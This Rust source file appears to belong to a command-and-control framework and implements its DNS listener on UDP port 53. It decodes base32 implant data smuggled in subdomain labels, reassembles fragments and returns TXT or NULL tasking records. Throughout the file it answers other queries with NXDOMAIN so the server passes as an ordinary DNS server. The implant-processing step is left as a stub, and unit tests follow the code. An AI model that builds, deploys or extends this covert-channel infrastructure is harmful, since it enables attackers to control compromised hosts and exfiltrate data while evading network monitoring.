//! DNS Listener — UDP DNS server (port 53)
//!
//! Parses incoming DNS queries, extracts implant data from subdomain labels,
//! responds with TXT/NULL records containing tasking data. Supports both
//! standard DNS (UDP) and acts as the server-side counterpart to the
//! implant's DNS/DoH channel.

use std::collections::HashMap;
use std::net::SocketAddr;
use std::sync::Arc;

use tokio::net::UdpSocket;
use tokio::sync::{oneshot, Mutex};

use crate::session::SessionManager;
use crate::task::TaskDispatcher;

// ── DNS Wire Format Constants ────────────────────────────────────────────────

/// DNS header size in bytes
const DNS_HEADER_SIZE: usize = 12;
/// Maximum DNS message size (UDP)
const DNS_MAX_UDP_SIZE: usize = 512;
/// Maximum label length
const DNS_MAX_LABEL_LEN: usize = 63;
/// Maximum domain name length
#[allow(dead_code)]
const DNS_MAX_NAME_LEN: usize = 253;

// DNS record types
#[allow(dead_code)]
const DNS_TYPE_A: u16 = 1;
const DNS_TYPE_TXT: u16 = 16;
#[allow(dead_code)]
const DNS_TYPE_AAAA: u16 = 28;
const DNS_TYPE_NULL: u16 = 10;
#[allow(dead_code)]
const DNS_TYPE_CNAME: u16 = 5;

// DNS classes
const DNS_CLASS_IN: u16 = 1;

// DNS response codes
const DNS_RCODE_OK: u16 = 0;
const DNS_RCODE_NXDOMAIN: u16 = 3;

// DNS header flags
const DNS_FLAG_QR: u16 = 0x8000; // Response
const DNS_FLAG_AA: u16 = 0x0400; // Authoritative
const DNS_FLAG_RD: u16 = 0x0100; // Recursion desired
const DNS_FLAG_RA: u16 = 0x0080; // Recursion available

// ── DNS Header ───────────────────────────────────────────────────────────────

/// Parsed DNS header
#[derive(Debug, Clone)]
pub struct DnsHeader {
    pub id: u16,
    pub flags: u16,
    pub qd_count: u16,
    pub an_count: u16,
    pub ns_count: u16,
    pub ar_count: u16,
}

impl DnsHeader {
    pub fn parse(data: &[u8]) -> Option<Self> {
        if data.len() < DNS_HEADER_SIZE {
            return None;
        }
        Some(Self {
            id: u16::from_be_bytes([data[0], data[1]]),
            flags: u16::from_be_bytes([data[2], data[3]]),
            qd_count: u16::from_be_bytes([data[4], data[5]]),
            an_count: u16::from_be_bytes([data[6], data[7]]),
            ns_count: u16::from_be_bytes([data[8], data[9]]),
            ar_count: u16::from_be_bytes([data[10], data[11]]),
        })
    }

    pub fn to_bytes(&self) -> [u8; DNS_HEADER_SIZE] {
        let mut buf = [0u8; DNS_HEADER_SIZE];
        buf[0..2].copy_from_slice(&self.id.to_be_bytes());
        buf[2..4].copy_from_slice(&self.flags.to_be_bytes());
        buf[4..6].copy_from_slice(&self.qd_count.to_be_bytes());
        buf[6..8].copy_from_slice(&self.an_count.to_be_bytes());
        buf[8..10].copy_from_slice(&self.ns_count.to_be_bytes());
        buf[10..12].copy_from_slice(&self.ar_count.to_be_bytes());
        buf
    }

    pub fn is_query(&self) -> bool {
        (self.flags & DNS_FLAG_QR) == 0
    }
}

// ── DNS Question ─────────────────────────────────────────────────────────────

/// Parsed DNS question
#[derive(Debug, Clone)]
pub struct DnsQuestion {
    pub name: String,
    pub labels: Vec<String>,
    pub qtype: u16,
    pub qclass: u16,
    /// Byte offset after this question in the packet
    pub end_offset: usize,
}

/// Parse a DNS name from wire format, returning (name, labels, bytes_consumed)
pub fn parse_dns_name(data: &[u8], offset: usize) -> Option<(String, Vec<String>, usize)> {
    let mut labels = Vec::new();
    let mut pos = offset;
    let mut name_parts = Vec::new();

    loop {
        if pos >= data.len() {
            return None;
        }

        let label_len = data[pos] as usize;
        if label_len == 0 {
            pos += 1;
            break;
        }

        // Compression pointer (top 2 bits set)
        if (label_len & 0xC0) == 0xC0 {
            if pos + 1 >= data.len() {
                return None;
            }
            // We don't follow compression pointers for C2 data extraction
            pos += 2;
            break;
        }

        if label_len > DNS_MAX_LABEL_LEN {
            return None;
        }

        pos += 1;
        if pos + label_len > data.len() {
            return None;
        }

        let label = String::from_utf8_lossy(&data[pos..pos + label_len]).to_string();
        name_parts.push(label.clone());
        labels.push(label);
        pos += label_len;
    }

    let name = name_parts.join(".");
    Some((name, labels, pos - offset))
}

/// Parse a DNS question section
pub fn parse_question(data: &[u8], offset: usize) -> Option<DnsQuestion> {
    let (name, labels, name_len) = parse_dns_name(data, offset)?;

    let type_offset = offset + name_len;
    if type_offset + 4 > data.len() {
        return None;
    }

    let qtype = u16::from_be_bytes([data[type_offset], data[type_offset + 1]]);
    let qclass = u16::from_be_bytes([data[type_offset + 2], data[type_offset + 3]]);

    Some(DnsQuestion {
        name,
        labels,
        qtype,
        qclass,
        end_offset: type_offset + 4,
    })
}

// ── DNS C2 Data Extraction ───────────────────────────────────────────────────

/// Extracted C2 data from a DNS query's subdomain labels.
/// Format: `<base32_chunk>.<seq>.<session_id>.c2domain.com`
#[derive(Debug, Clone)]
pub struct DnsC2Data {
    pub session_id: String,
    pub sequence: u32,
    pub data: Vec<u8>,
}

/// Base32 decode (lowercase, no padding) — matches implant's encoding
pub fn base32_decode(input: &str) -> Option<Vec<u8>> {
    const ALPHABET: &[u8] = b"abcdefghijklmnopqrstuvwxyz234567";

    let mut bits: u64 = 0;
    let mut bit_count = 0u32;
    let mut output = Vec::new();

    for &ch in input.as_bytes() {
        let val = ALPHABET.iter().position(|&c| c == ch)? as u64;
        bits = (bits << 5) | val;
        bit_count += 5;

        if bit_count >= 8 {
            bit_count -= 8;
            output.push((bits >> bit_count) as u8);
            bits &= (1u64 << bit_count) - 1;
        }
    }

    Some(output)
}

/// Base32 encode (lowercase, no padding) — matches implant's encoding
pub fn base32_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8] = b"abcdefghijklmnopqrstuvwxyz234567";

    let mut bits: u64 = 0;
    let mut bit_count = 0u32;
    let mut output = String::new();

    for &byte in data {
        bits = (bits << 8) | byte as u64;
        bit_count += 8;

        while bit_count >= 5 {
            bit_count -= 5;
            let idx = ((bits >> bit_count) & 0x1F) as usize;
            output.push(ALPHABET[idx] as char);
        }
    }

    // Remaining bits
    if bit_count > 0 {
        let idx = ((bits << (5 - bit_count)) & 0x1F) as usize;
        output.push(ALPHABET[idx] as char);
    }

    output
}

/// Extract C2 data from DNS query labels.
/// Expected format: `<base32_data>.<seq_num>.<session_id>.<c2domain>.<tld>`
/// The last 2 labels are the C2 domain, everything before is implant data.
pub fn extract_c2_data(question: &DnsQuestion, c2_domain: &str) -> Option<DnsC2Data> {
    let domain_labels: Vec<&str> = c2_domain.split('.').collect();
    let n_domain_labels = domain_labels.len();

    if question.labels.len() <= n_domain_labels + 2 {
        return None; // Need at least: data + seq + session_id + domain labels
    }

    let n_labels = question.labels.len();

    // Verify the C2 domain suffix matches
    for (i, domain_label) in domain_labels.iter().enumerate() {
        let label_idx = n_labels - n_domain_labels + i;
        if question.labels[label_idx].to_lowercase() != domain_label.to_lowercase() {
            return None;
        }
    }

    // Extract session_id (label before C2 domain)
    let session_idx = n_labels - n_domain_labels - 1;
    let session_id = question.labels[session_idx].clone();

    // Extract sequence number (label before session_id)
    let seq_idx = n_labels - n_domain_labels - 2;
    let sequence: u32 = question.labels[seq_idx].parse().ok()?;

    // Everything before seq is base32-encoded data
    let data_labels: Vec<&str> = question.labels[..seq_idx]
        .iter()
        .map(|s| s.as_str())
        .collect();
    let encoded = data_labels.join("");

    let data = base32_decode(&encoded)?;

    Some(DnsC2Data {
        session_id,
        sequence,
        data,
    })
}

// ── DNS Response Builder ─────────────────────────────────────────────────────

/// Encode a DNS name into wire format
pub fn encode_dns_name(name: &str) -> Vec<u8> {
    let mut buf = Vec::new();
    for label in name.split('.') {
        if label.is_empty() {
            continue;
        }
        let len = label.len().min(DNS_MAX_LABEL_LEN);
        buf.push(len as u8);
        buf.extend_from_slice(&label.as_bytes()[..len]);
    }
    buf.push(0); // Root label
    buf
}

/// Build a DNS response with TXT record data
pub fn build_txt_response(
    query: &[u8],
    header: &DnsHeader,
    question: &DnsQuestion,
    txt_data: &[u8],
) -> Vec<u8> {
    let mut resp = Vec::with_capacity(DNS_MAX_UDP_SIZE);

    // Response header
    let resp_header = DnsHeader {
        id: header.id,
        flags: DNS_FLAG_QR | DNS_FLAG_AA | DNS_FLAG_RD | DNS_FLAG_RA | DNS_RCODE_OK,
        qd_count: 1,
        an_count: 1,
        ns_count: 0,
        ar_count: 0,
    };
    resp.extend_from_slice(&resp_header.to_bytes());

    // Copy question section from original query
    if query.len() >= question.end_offset {
        resp.extend_from_slice(&query[DNS_HEADER_SIZE..question.end_offset]);
    }

    // Answer: name pointer to question
    resp.extend_from_slice(&[0xC0, 0x0C]); // Compression pointer to offset 12

    // Type TXT, Class IN
    resp.extend_from_slice(&DNS_TYPE_TXT.to_be_bytes());
    resp.extend_from_slice(&DNS_CLASS_IN.to_be_bytes());

    // TTL (60 seconds)
    resp.extend_from_slice(&60u32.to_be_bytes());

    // TXT RDATA: split into 255-byte chunks
    let mut rdata = Vec::new();
    let mut offset = 0;
    while offset < txt_data.len() {
        let chunk_len = (txt_data.len() - offset).min(255);
        rdata.push(chunk_len as u8);
        rdata.extend_from_slice(&txt_data[offset..offset + chunk_len]);
        offset += chunk_len;
    }
    if txt_data.is_empty() {
        rdata.push(0);
    }

    // RDLENGTH
    resp.extend_from_slice(&(rdata.len() as u16).to_be_bytes());
    resp.extend_from_slice(&rdata);

    resp
}

/// Build a DNS response with NULL record data (type 10)
pub fn build_null_response(
    query: &[u8],
    header: &DnsHeader,
    question: &DnsQuestion,
    null_data: &[u8],
) -> Vec<u8> {
    let mut resp = Vec::with_capacity(DNS_MAX_UDP_SIZE);

    let resp_header = DnsHeader {
        id: header.id,
        flags: DNS_FLAG_QR | DNS_FLAG_AA | DNS_FLAG_RD | DNS_FLAG_RA | DNS_RCODE_OK,
        qd_count: 1,
        an_count: 1,
        ns_count: 0,
        ar_count: 0,
    };
    resp.extend_from_slice(&resp_header.to_bytes());

    // Copy question section
    if query.len() >= question.end_offset {
        resp.extend_from_slice(&query[DNS_HEADER_SIZE..question.end_offset]);
    }

    // Answer: name pointer, type NULL, class IN
    resp.extend_from_slice(&[0xC0, 0x0C]);
    resp.extend_from_slice(&DNS_TYPE_NULL.to_be_bytes());
    resp.extend_from_slice(&DNS_CLASS_IN.to_be_bytes());
    resp.extend_from_slice(&60u32.to_be_bytes()); // TTL

    // RDLENGTH + data
    resp.extend_from_slice(&(null_data.len() as u16).to_be_bytes());
    resp.extend_from_slice(null_data);

    resp
}

/// Build an NXDOMAIN response
pub fn build_nxdomain_response(
    query: &[u8],
    header: &DnsHeader,
    question: &DnsQuestion,
) -> Vec<u8> {
    let mut resp = Vec::with_capacity(DNS_MAX_UDP_SIZE);

    let resp_header = DnsHeader {
        id: header.id,
        flags: DNS_FLAG_QR | DNS_FLAG_AA | DNS_FLAG_RD | DNS_FLAG_RA | DNS_RCODE_NXDOMAIN,
        qd_count: 1,
        an_count: 0,
        ns_count: 0,
        ar_count: 0,
    };
    resp.extend_from_slice(&resp_header.to_bytes());

    // Copy question section
    if query.len() >= question.end_offset {
        resp.extend_from_slice(&query[DNS_HEADER_SIZE..question.end_offset]);
    }

    resp
}

// ── DNS Reassembly Buffer ────────────────────────────────────────────────────

/// Tracks fragments for reassembly of multi-query payloads
#[derive(Debug)]
pub struct ReassemblyBuffer {
    pub fragments: HashMap<u32, Vec<u8>>,
    pub total_expected: Option<u32>,
}

impl ReassemblyBuffer {
    pub fn new() -> Self {
        Self {
            fragments: HashMap::new(),
            total_expected: None,
        }
    }

    /// Insert a fragment. Returns the reassembled payload if all fragments received.
    pub fn insert(&mut self, seq: u32, data: Vec<u8>) -> Option<Vec<u8>> {
        self.fragments.insert(seq, data);

        // Check if we can reassemble (contiguous from 0)
        let mut seq_num = 0u32;
        while self.fragments.contains_key(&seq_num) {
            seq_num += 1;
        }

        // If we have a gap or don't know total, can't reassemble yet
        if let Some(total) = self.total_expected {
            if seq_num >= total {
                let mut result = Vec::new();
                for i in 0..total {
                    if let Some(frag) = self.fragments.get(&i) {
                        result.extend_from_slice(frag);
                    }
                }
                return Some(result);
            }
        }

        None
    }

    pub fn clear(&mut self) {
        self.fragments.clear();
        self.total_expected = None;
    }
}

impl Default for ReassemblyBuffer {
    fn default() -> Self {
        Self::new()
    }
}

// ── DNS Listener State ───────────────────────────────────────────────────────

/// Configuration for the DNS listener
#[derive(Debug, Clone)]
pub struct DnsListenerConfig {
    pub bind_address: String,
    pub port: u16,
    pub c2_domain: String,
}

/// Shared state for the DNS listener
pub struct DnsListenerState {
    pub session_manager: Arc<SessionManager>,
    pub task_dispatcher: Arc<TaskDispatcher>,
    pub config: DnsListenerConfig,
    pub reassembly: Mutex<HashMap<String, ReassemblyBuffer>>,
}

// ── DNS Listener ─────────────────────────────────────────────────────────────

/// Process a single DNS query and produce a response
pub async fn process_dns_query(query: &[u8], state: &DnsListenerState) -> Option<Vec<u8>> {
    // Parse header
    let header = DnsHeader::parse(query)?;
    if !header.is_query() || header.qd_count == 0 {
        return None;
    }

    // Parse first question
    let question = parse_question(query, DNS_HEADER_SIZE)?;

    // Try to extract C2 data from subdomain labels
    let c2_data = extract_c2_data(&question, &state.config.c2_domain);

    match c2_data {
        Some(data) => {
            // C2 traffic — process the implant data
            tracing::debug!(
                "DNS C2 query: session={}, seq={}, data_len={}",
                data.session_id,
                data.sequence,
                data.data.len()
            );

            // TODO: Process implant data through session_manager/task_dispatcher
            // For now, respond with empty TXT (acknowledgement)
            let response_data = base32_encode(b"ok");

            match question.qtype {
                DNS_TYPE_TXT => Some(build_txt_response(
                    query,
                    &header,
                    &question,
                    response_data.as_bytes(),
                )),
                DNS_TYPE_NULL => Some(build_null_response(
                    query,
                    &header,
                    &question,
                    response_data.as_bytes(),
                )),
                _ => {
                    // Respond with NXDOMAIN for unsupported types
                    Some(build_nxdomain_response(query, &header, &question))
                }
            }
        }
        None => {
            // Not C2 traffic — respond with NXDOMAIN to look like a normal DNS server
            Some(build_nxdomain_response(query, &header, &question))
        }
    }
}

/// Start the DNS listener on the specified UDP port.
/// Returns a shutdown sender to stop the listener.
pub async fn start_dns_listener(
    state: Arc<DnsListenerState>,
) -> Result<oneshot::Sender<()>, String> {
    let addr: SocketAddr = format!("{}:{}", state.config.bind_address, state.config.port)
        .parse()
        .map_err(|e| format!("Invalid address: {e}"))?;

    let socket = UdpSocket::bind(addr)
        .await
        .map_err(|e| format!("Failed to bind UDP {addr}: {e}"))?;

    let (shutdown_tx, mut shutdown_rx) = oneshot::channel::<()>();

    tracing::info!("DNS listener started on {addr}");

    tokio::spawn(async move {
        let mut buf = [0u8; DNS_MAX_UDP_SIZE];

        loop {
            tokio::select! {
                result = socket.recv_from(&mut buf) => {
                    match result {
                        Ok((len, src)) => {
                            let query = buf[..len].to_vec();
                            let state_clone = Arc::clone(&state);

                            tokio::spawn(async move {
                                if let Some(response) = process_dns_query(&query, &state_clone).await {
                                    if let Err(e) = socket_send_to_addr(&response, src).await {
                                        tracing::warn!("Failed to send DNS response: {e}");
                                    }
                                }
                            });
                        }
                        Err(e) => {
                            tracing::error!("DNS recv error: {e}");
                        }
                    }
                }
                _ = &mut shutdown_rx => {
                    tracing::info!("DNS listener shutting down");
                    break;
                }
            }
        }
    });

    Ok(shutdown_tx)
}

/// Helper to send a UDP response (spawned task can't borrow socket)
async fn socket_send_to_addr(data: &[u8], addr: SocketAddr) -> Result<(), String> {
    let socket = UdpSocket::bind("0.0.0.0:0")
        .await
        .map_err(|e| format!("Bind error: {e}"))?;
    socket
        .send_to(data, addr)
        .await
        .map_err(|e| format!("Send error: {e}"))?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_base32_roundtrip() {
        let data = b"hello world";
        let encoded = base32_encode(data);
        let decoded = base32_decode(&encoded).unwrap();
        assert_eq!(decoded, data);
    }

    #[test]
    fn test_base32_encode_known() {
        assert_eq!(base32_encode(b"f"), "my");
        assert_eq!(base32_encode(b"fo"), "mzxq");
        assert_eq!(base32_encode(b"foo"), "mzxw6");
        assert_eq!(base32_encode(b"foob"), "mzxw6yq");
        assert_eq!(base32_encode(b"fooba"), "mzxw6ytb");
        assert_eq!(base32_encode(b"foobar"), "mzxw6ytboi");
    }

    #[test]
    fn test_base32_decode_known() {
        assert_eq!(base32_decode("my").unwrap(), b"f");
        assert_eq!(base32_decode("mzxq").unwrap(), b"fo");
        assert_eq!(base32_decode("mzxw6").unwrap(), b"foo");
    }

    #[test]
    fn test_dns_header_parse() {
        let mut pkt = [0u8; 12];
        pkt[0] = 0xAB;
        pkt[1] = 0xCD; // ID
        pkt[2] = 0x01;
        pkt[3] = 0x00; // RD flag
        pkt[4] = 0x00;
        pkt[5] = 0x01; // QDCOUNT = 1

        let header = DnsHeader::parse(&pkt).unwrap();
        assert_eq!(header.id, 0xABCD);
        assert!(header.is_query());
        assert_eq!(header.qd_count, 1);
    }

    #[test]
    fn test_dns_header_response() {
        let mut pkt = [0u8; 12];
        pkt[2] = 0x80; // QR flag set (response)

        let header = DnsHeader::parse(&pkt).unwrap();
        assert!(!header.is_query());
    }

    #[test]
    fn test_dns_header_too_short() {
        let pkt = [0u8; 11];
        assert!(DnsHeader::parse(&pkt).is_none());
    }

    #[test]
    fn test_parse_dns_name() {
        // Encode "test.example.com"
        let pkt = [
            4, b't', b'e', b's', b't', 7, b'e', b'x', b'a', b'm', b'p', b'l', b'e', 3, b'c', b'o',
            b'm', 0, // root
        ];
        let (name, labels, consumed) = parse_dns_name(&pkt, 0).unwrap();
        assert_eq!(name, "test.example.com");
        assert_eq!(labels, vec!["test", "example", "com"]);
        assert_eq!(consumed, pkt.len());
    }

    #[test]
    fn test_parse_question() {
        let mut pkt = Vec::new();
        // Name: "test.example.com"
        pkt.extend_from_slice(&[4, b't', b'e', b's', b't']);
        pkt.extend_from_slice(&[7, b'e', b'x', b'a', b'm', b'p', b'l', b'e']);
        pkt.extend_from_slice(&[3, b'c', b'o', b'm']);
        pkt.push(0);
        // Type TXT
        pkt.extend_from_slice(&DNS_TYPE_TXT.to_be_bytes());
        // Class IN
        pkt.extend_from_slice(&DNS_CLASS_IN.to_be_bytes());

        let q = parse_question(&pkt, 0).unwrap();
        assert_eq!(q.name, "test.example.com");
        assert_eq!(q.qtype, DNS_TYPE_TXT);
        assert_eq!(q.qclass, DNS_CLASS_IN);
    }

    #[test]
    fn test_extract_c2_data() {
        // Simulate: mzxw6.0.session123.c2.example.com TXT
        let question = DnsQuestion {
            name: "mzxw6.0.session123.c2.example.com".to_string(),
            labels: vec![
                "mzxw6".to_string(),
                "0".to_string(),
                "session123".to_string(),
                "c2".to_string(),
                "example".to_string(),
                "com".to_string(),
            ],
            qtype: DNS_TYPE_TXT,
            qclass: DNS_CLASS_IN,
            end_offset: 0,
        };

        let data = extract_c2_data(&question, "c2.example.com").unwrap();
        assert_eq!(data.session_id, "session123");
        assert_eq!(data.sequence, 0);
        assert_eq!(data.data, b"foo");
    }

    #[test]
    fn test_extract_c2_data_wrong_domain() {
        let question = DnsQuestion {
            name: "mzxw6.0.sess.wrong.domain.com".to_string(),
            labels: vec![
                "mzxw6".to_string(),
                "0".to_string(),
                "sess".to_string(),
                "wrong".to_string(),
                "domain".to_string(),
                "com".to_string(),
            ],
            qtype: DNS_TYPE_TXT,
            qclass: DNS_CLASS_IN,
            end_offset: 0,
        };

        assert!(extract_c2_data(&question, "c2.example.com").is_none());
    }

    #[test]
    fn test_encode_dns_name() {
        let encoded = encode_dns_name("test.example.com");
        let expected = vec![
            4, b't', b'e', b's', b't', 7, b'e', b'x', b'a', b'm', b'p', b'l', b'e', 3, b'c', b'o',
            b'm', 0,
        ];
        assert_eq!(encoded, expected);
    }

    #[test]
    fn test_build_txt_response() {
        // Build a minimal query packet
        let mut query = Vec::new();
        // Header: ID=0x1234, standard query, QDCOUNT=1
        query.extend_from_slice(&[
            0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ]);
        // Question: test.example.com TXT IN
        query.extend_from_slice(&[4, b't', b'e', b's', b't']);
        query.extend_from_slice(&[7, b'e', b'x', b'a', b'm', b'p', b'l', b'e']);
        query.extend_from_slice(&[3, b'c', b'o', b'm', 0]);
        query.extend_from_slice(&DNS_TYPE_TXT.to_be_bytes());
        query.extend_from_slice(&DNS_CLASS_IN.to_be_bytes());

        let header = DnsHeader::parse(&query).unwrap();
        let question = parse_question(&query, DNS_HEADER_SIZE).unwrap();

        let response = build_txt_response(&query, &header, &question, b"hello");

        // Verify response header
        let resp_header = DnsHeader::parse(&response).unwrap();
        assert_eq!(resp_header.id, 0x1234);
        assert!(!resp_header.is_query());
        assert_eq!(resp_header.qd_count, 1);
        assert_eq!(resp_header.an_count, 1);
    }

    #[test]
    fn test_build_nxdomain_response() {
        let mut query = Vec::new();
        query.extend_from_slice(&[
            0xAB, 0xCD, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ]);
        query.extend_from_slice(&[4, b't', b'e', b's', b't']);
        query.extend_from_slice(&[3, b'c', b'o', b'm', 0]);
        query.extend_from_slice(&DNS_TYPE_A.to_be_bytes());
        query.extend_from_slice(&DNS_CLASS_IN.to_be_bytes());

        let header = DnsHeader::parse(&query).unwrap();
        let question = parse_question(&query, DNS_HEADER_SIZE).unwrap();

        let response = build_nxdomain_response(&query, &header, &question);

        let resp_header = DnsHeader::parse(&response).unwrap();
        assert_eq!(resp_header.id, 0xABCD);
        assert!(!resp_header.is_query());
        assert_eq!(resp_header.an_count, 0);
        assert_eq!(resp_header.flags & 0x000F, DNS_RCODE_NXDOMAIN);
    }

    #[test]
    fn test_reassembly_buffer() {
        let mut buf = ReassemblyBuffer::new();
        buf.total_expected = Some(3);

        assert!(buf.insert(0, b"aaa".to_vec()).is_none());
        assert!(buf.insert(2, b"ccc".to_vec()).is_none());
        let result = buf.insert(1, b"bbb".to_vec()).unwrap();
        assert_eq!(result, b"aaabbbccc");
    }

    #[test]
    fn test_reassembly_buffer_single() {
        let mut buf = ReassemblyBuffer::new();
        buf.total_expected = Some(1);

        let result = buf.insert(0, b"only".to_vec()).unwrap();
        assert_eq!(result, b"only");
    }

    #[test]
    fn test_build_null_response() {
        let mut query = Vec::new();
        query.extend_from_slice(&[
            0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ]);
        query.extend_from_slice(&[4, b't', b'e', b's', b't', 3, b'c', b'o', b'm', 0]);
        query.extend_from_slice(&DNS_TYPE_NULL.to_be_bytes());
        query.extend_from_slice(&DNS_CLASS_IN.to_be_bytes());

        let header = DnsHeader::parse(&query).unwrap();
        let question = parse_question(&query, DNS_HEADER_SIZE).unwrap();

        let response = build_null_response(&query, &header, &question, b"\x01\x02\x03");

        let resp_header = DnsHeader::parse(&response).unwrap();
        assert_eq!(resp_header.an_count, 1);
        assert!(!resp_header.is_query());
    }
}
